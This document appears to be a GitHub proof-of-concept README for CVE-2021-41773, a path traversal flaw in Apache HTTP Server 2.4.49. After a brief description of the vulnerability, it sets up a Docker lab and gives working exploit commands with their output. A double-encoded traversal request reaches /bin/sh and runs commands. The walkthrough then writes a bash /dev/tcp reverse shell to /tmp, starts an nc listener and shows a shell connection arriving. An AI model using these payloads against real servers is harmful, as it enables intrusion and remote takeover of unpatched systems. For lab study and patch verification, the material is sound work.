# CVE-2021-41773
## 🐛 Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49
A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

This issue is known to be exploited in the wild.

This issue only affects Apache 2.4.49 and not earlier versions.

[source](https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2021-41773)

## Path Traversal
#### Overview
A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system).

This attack is also known as “dot-dot-slash”, “directory traversal”, “directory climbing” and “backtracking”.


## Proof Of Concept

### Set up the PoC environment

```
$ docker-compose build
$ docker-compose up
```

**Confirm it works**

```
$ curl http://localhost:1234
<html><body><h1>It works!</h1></body></html>
```

### Exploit

Victim : ``localhost:1234``  
Attacker : ``192.168.1.12``  

According to the documentation, this is a flaw that allows us to execute code on remote (RCE).  
We can exploit it by doing a curl with the cgi-bin folder.

```bash
$ curl 'http://<victim_ip>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type:text/plain; echo; <command>'
````

- **1. RCE**  
   Let's see if we actually have access to command, say ``id`` :
   ````bash
   $ curl 'http://localhost:1234/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type:text/plain; echo; id'
   uid=1(daemon) gid=1(daemon) groups=1(daemon)
   ````
- **2. Reverse shell**  
   We will test a reverse shell by creating a bash file on the victim's server.  
   Let's take as an example the reverse shell in bash found on the [PayloadsAllTheThings](https://github.com/LudovicPatho/PayloadsAllTheThings/) repo.  

   *Here is an example :*  
   [``bash -i >& /dev/tcp/10.0.0.1/4242 0>&1``](https://github.com/LudovicPatho/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)   

   Let's create the file ``vuln.sh`` on the victim's machine in the ``/tmp/`` folder !  
   This file will contain our reverse shell that we can run remotely. It will connect to our local machine on port 44.  
   ````bash
   $  curl 'http://localhost:1234/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type:text/plain; echo; echo "#!/bin/bash\nbash -i >& /dev/tcp/192.168.1.12/44 0>&1" > /tmp/vuln.sh'
   ````

   You can check the contents of the file with the ``cat`` command
   ````bash
   $ curl 'http://localhost:1234/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type:text/plain; echo; cat /tmp/vuln.sh'
   #!/bin/bash
   bash -i >& /dev/tcp/192.168.1.12/44 0>&1
  ````
- **3. Listener with ncat**  
   Let's create the listener on the local machine.
   ````bash
   $ nc -lvnp 44
   ````
   All that remains is to execute the remote file.
   ````bash
   $ curl 'http://localhost:1234/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type:
   text/plain; echo; bash /tmp/vuln.sh'
   ````

   Response :
   ````
   Ncat: Version 7.91 ( https://nmap.org/ncat )
   Ncat: Listening on :::44
   Ncat: Listening on 0.0.0.0:44
   Ncat: Connection from 172.19.32.1.
   Ncat: Connection from 172.19.32.1:58963.
   ````

## References
- https://httpd.apache.org/security/vulnerabilities_24.html
- https://github.com/apache/httpd/commit/98246aa96079dad5f7b20521bbc0142a04f1c5e7

